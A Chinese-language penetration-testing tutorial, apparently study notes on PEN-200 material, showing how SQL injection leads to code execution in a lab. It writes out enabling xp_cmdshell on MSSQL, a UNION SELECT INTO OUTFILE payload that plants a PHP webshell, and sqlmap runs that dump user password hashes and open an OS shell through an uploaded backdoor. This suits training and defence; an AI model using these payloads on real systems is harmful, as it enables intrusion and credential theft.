---
title: "自動化 SQL Injection 漏洞執行"
description: "取決於作業系統、服務的權限以及檔案系統的存取範圍，SQL Injection 漏洞可以被用來讀寫目標作業系統下的檔案，當我們做出一份包含 PHP 程式碼的檔案，並且放進網頁伺服器裡的 root 路徑時，我們可以利用該檔案來獲得完整的隨意程式執行"
hideTOC: false
targetKeyword: SQL Injection
draft: false
date: 2026-01-20
tags: 
  - "mssql"
  - "mysql"
  - "sqlmap"
  - "sql注入"
  - "xp_cmdshell"
lang: zh
---
取決於作業系統、服務的權限以及檔案系統的存取範圍，SQL Injection 漏洞可以被用來讀寫目標作業系統下的檔案，當我們做出一份包含 PHP 程式碼的檔案，並且放進網頁伺服器裡的 root 路徑時，我們可以利用該檔案來獲得完整的隨意程式執行

## 手動 Code 執行 SQL Injection

針對我們先前提到的那些資料庫系統，我們需要修改我們的策略來獲得執行 code 的權限

### Microsoft SQL Server

對於 Microsoft SQL 伺服器，我們可以利用 xp_cmdshell 函數來取得字串內容並且在指令視窗裡執行，該函數會回傳給我們結果，不過這個功能預設是關閉的，所以每次進到新的目標系統內，都需要打開

而要呼叫該函數就必須用 "EXECUTE" 替換 SELECT 功能，在我們的測試環境裡，通常 Administrator 使用者就有足夠的權限，讓我們來嘗試使用 impacket-mssqlclient 工具利用 xp_cmdshell 函數來模擬 SQL Injection

```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

上述我們實驗從 Kali 連線到目標裡的 MSSQL 伺服器內，另外我們可以設定顯示進階選項，把 'show advanced options ' 標記為1，記得每次設定完都要使用 RECONFIGURE 來套用所有的變更，確認執行完這兩個功能後，我們就可以使用 EXECUTE 條件式

```
SQL> EXECUTE xp_cmdshell 'whoami';
output

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

nt service\mssql$sqlexpress

NULL
```

如果我們確實有管理員權限並且登入後，代表我們對於該資料庫系統有完全的控制，就可以輕鬆地升級 SQL 語法的版本，升級到有更多標準 reverse shell 的版本，有利於我們後續建構

### MySQL Server

接著我們換到 MySQL 資料庫來看，儘管有數種 MySQL 資料庫的改良版都不提供單一的功能來造出遠端隨意程式執行 (Remote Code Execution, RCE)，還是有辦法誤用 SELECT_INTO_OUTFILE 條件來寫入網頁伺服器裡的檔案

> 但要讓這個方法成功的話，目標資料庫系統上要允許底層使用者可以在想要的路徑下寫檔案

舉例來說，我們回憶先前在 MySQL 應用服務裡建構 [[manual-sql-injection-exploitation|手動 SQL Injection 漏洞利用]] unionbased-payloads 的方法，要擴充搜尋語法裡含寫入 webshell

我們一樣利用 UNION SELECT SQL 語法引入單行的 PHP 程式到第一行，並且在可以寫入檔案的路徑下儲存成 webshell.php 這個檔案

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

寫進去的 PHP 程式經過網頁伺服器的處理，就會變成下列表示

```
<? system($_REQUEST['cmd']); ?>
```

PHP 系統函式會接收使用者利用 HTTP REQUEST 提供的 cmd 參數，執行後變成類似網頁互動型的命令提示字元介面，如果我們嘗試上面的 payload 放進前端的 Lookup 欄位裡，在我們的實驗機器上它吐給我們下列的錯誤

![Writing-the-WebShell-to-Disk](https://media.secologies.com/Writing-the-WebShell-to-Disk.webp)
*[^1]*

幸運的是，該錯誤只是顯示回傳的資料型態錯誤，應該不影響我們 webshell 的寫入功能，要確保這一點，我們存取放在 tmp 資料夾底下新的 webshell，並且放入 id 參數檢查權限

![Accessing-the-newly-Webshell](https://media.secologies.com/Accessing-the-newly-Webshell.webp)
*[^1]*

太讚了！webshell 在前端頁面回傳我們所預期的 id 指令結果給我們，代表這個方法是可成功的，可以發現我們是使用 www-data 這個網頁伺服器最通用的使用者執行該指令的，通常這個是 Linux 系統底下架設網頁伺服器時最常見的角色

至此，我們已經了解到利用 SQL Injection 來手動獲得指令執行的功能，接著我們探討如何利用特定工具將整個過程自動化

## 自動化 SQL Injection 攻擊

在 Kali Linux 中有幾套已經預設裝好的工具可以讓我們來執行 SQL Injection 攻擊，舉例來說，sqlmap 就可以針對數種資料庫系統執行識別以及利用該版本的 SQL Injection 漏洞

我們一樣使用前一節的網頁應用服務執行 sqlmap 工具，使用 "-u" 來指定目標 URL，然後指定 "-p" 來測試

```
kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.11#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 02:14:54 PM /2026-01-16/
[14:14:54] [INFO] resuming back-end DBMS 'mysql'
[14:14:54] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to
follow? [Y/n]
you have not declared cookie(s), while server wants to set its own
('PHPSESSID=fbf1f5fa5fc...a7266cba36'). Do you want to use those [Y/n]
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
---
[14:14:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[14:14:57] [INFO] fetched data logged to text files under
'/home/kali/.local/share/sqlmap/output/192.168.50.16'
[*] ending @ 02:14:57 PM /2026-01-16/
```

在 sqlmap 裡我們 "-u" 指定完整的 URL 目錄，以及帶著 "?user" 參數，一旦組織好我們的指令後，我們可以一直按下 Enter 挑選預設的選項即可，接著都確認完後就讓 sqlmap 自動執行

預設選擇 time-based blind SQL Injection 方法即可該工具會提供額外的目標系統資訊，像是網頁伺服器的作業系統、網頁應用服務用哪些技術建構以及後端的資料庫資訊等等

上面的工具確保目標的 URL 存在 SQL Injection 漏洞，以此為基底我們可以延伸我們的想法，利用 sqlmap 來讓目標資料庫吐出表單資訊以及竊取使用者的身份認證資訊

> 儘管 sqlmap 是一套自動化執行 SQL Injection 攻擊的工具，甚至可以提供完美的隱私，但這也是雙面刃，該工具會製造許多的流量出現，所以通常在滲透測試時，sqlmap 並非我們的第一選擇，尤其是如果我們知道目標有偵測流量的軟體或硬體時

為了取得整個資料庫裡的內容，包括使用者認證資訊，我們一樣執行前面的指令，但這次帶上 "--dump" 這個參數

```
kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
...

[*] starting @ 02:23:49 PM /2026-01-16/

[14:23:49] [INFO] resuming back-end DBMS 'mysql'
[14:23:49] [INFO] testing connection to the target URL

got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to follow? [Y/n]
you have not declared cookie(s), while server wants to set its own
('PHPSESSID=b7c9c962b85...c6c7205dd1'). Do you want to use those [Y/n]
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
---
[14:23:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.0.12
[14:23:52] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:23:52] [INFO] fetching current database
[02:23:52 PM] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
[14:25:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[14:25:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)

[14:25:47] [INFO] adjusting time delay to 2 seconds due to good response times
hshuang
[14:27:01] [INFO] fetching tables for database: 'hshuang'
[14:27:01] [INFO] fetching number of tables for database 'hshuang'

[02:27:01 PM] [INFO] retrieved: 2
[02:27:11 PM] [INFO] retrieved: customers
[02:29:25 PM] [INFO] retrieved: users
[14:30:38] [INFO] fetching columns for table 'users' in database 'hshuang'
[02:30:38 PM] [INFO] retrieved: 4
[02:30:44 PM] [INFO] retrieved: id
[02:31:14 PM] [INFO] retrieved: username
[02:33:02 PM] [INFO] retrieved: password
[02:35:09 PM] [INFO] retrieved: description
[14:37:56] [INFO] fetching entries for table 'users' in database 'hshuang'
[14:37:56] [INFO] fetching number of entries for table 'users' in database 'hshuang'
[02:37:56 PM] [INFO] retrieved: 4
[02:38:02 PM] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[14:38:24] [INFO] adjusting time delay to 1 second due to good response times this is the admin
[02:40:54 PM] [INFO] retrieved: 1
[02:41:02 PM] [INFO] retrieved: 21232f297a57a5a743894a0e4a801fc3
[02:46:34 PM] [INFO] retrieved: admin
[02:47:15 PM] [INFO] retrieved: try harder
[02:48:44 PM] [INFO] retrieved: 2
[02:48:54 PM] [INFO] retrieved: f9664ea1803311b35f
...
```

由於我們是用盲時間基底的 SQL Injection 漏洞，每一次的檢測都需要等個幾秒，所以撈完整張表單需要的時間比較長，但最終我們還是取得了所有使用者 hash 過的身份驗證資訊

sqlmap 另一項核心功能則是 "--os-shell" 參數，該指令可以提供給我們完整的互動式 shell，由於 time-based blind SQL Injection 的間隔時間太長，代表不太適合用在互動式 shell 上，挑選我們前面提到的 UNION 基底的 SQL Injection 比較適合

首先我們需要利用 Burp Suite 攔截我們送出去的 POST 請求，將其儲存成本地文字檔放在我們的 Kali 機器上

```
POST /search.php HTTP/1.1
Host: 192.168.50.19
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.50.19
Connection: close
Referer: http://192.168.50.19/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1

item=test
```

接著，我們再次呼叫 sqlmap 工具帶上 "-r" 參數，以及我們方才儲存的 POST 請求檔案，另外我們還要指定哪個參數對於 sqlmap 是有漏洞的，我們剛才檢查出來的是 "item"，最後，我們使用 "--os-shell" 參數搭配之前發現可以寫檔案的路徑底下

```
kali@kali:~$ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
...
[*] starting @ 02:20:47 PM /2026-01-19/

[14:20:47] [INFO] parsing HTTP request from 'post'
[14:20:47] [INFO] resuming back-end DBMS 'mysql'
[14:20:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
...
---
[14:20:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.6
[14:20:48] [INFO] going to use a web backdoor for command prompt
[14:20:48] [INFO] fingerprinting the back-end DBMS operating system
[14:20:48] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
[14:20:49] [INFO] retrieved web server absolute paths: '/var/www/html/search.php'
[14:20:49] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via LIMIT 'LINES TERMINATED BY' method
[14:20:50] [WARNING] unable to upload the file stager on '/var/www/html/tmp/'
[14:20:50] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via UNION method
[14:20:50] [WARNING] expect junk characters inside the file as a leftover from UNION query
[14:20:50] [INFO] the remote file '/var/www/html/tmp/tmpuqgek.php' is larger (713 B) than the local file '/tmp/sqlmapxkydllxb82218/tmp3d64iosz' (709B)
[14:20:51] [INFO] the file stager has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpuqgek.php
[14:20:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpbetmz.php
[14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: '/var/www/html/tmp'
```

一旦 sqlmap 確認漏洞存在，它會提示我們要針對哪一種程式語言進行檢驗，預設我們選擇 PHP，接著 sqlmap 上傳官方寫好的 webshell 到指定的網頁目錄底下，並且回傳互動式的 reverse shell，我們就可以送出任何我們想要執行的系統指令了

我們從識別以及枚舉 SQL Injection 漏洞的方法開始，也測試了不同的 payload 來誤用網頁應用服務成漏洞的樣子，並且也嘗試手動執行任意程式執行，最終，我們帶給讀者說 sqlmap 這套常見的自動化工具可以完成整個攻擊。

[^1]: OffSec, “SQL Injection Attacks: Manual and Automated Code Execution,” The Penetration Testing with Kali Linux (PEN-200).

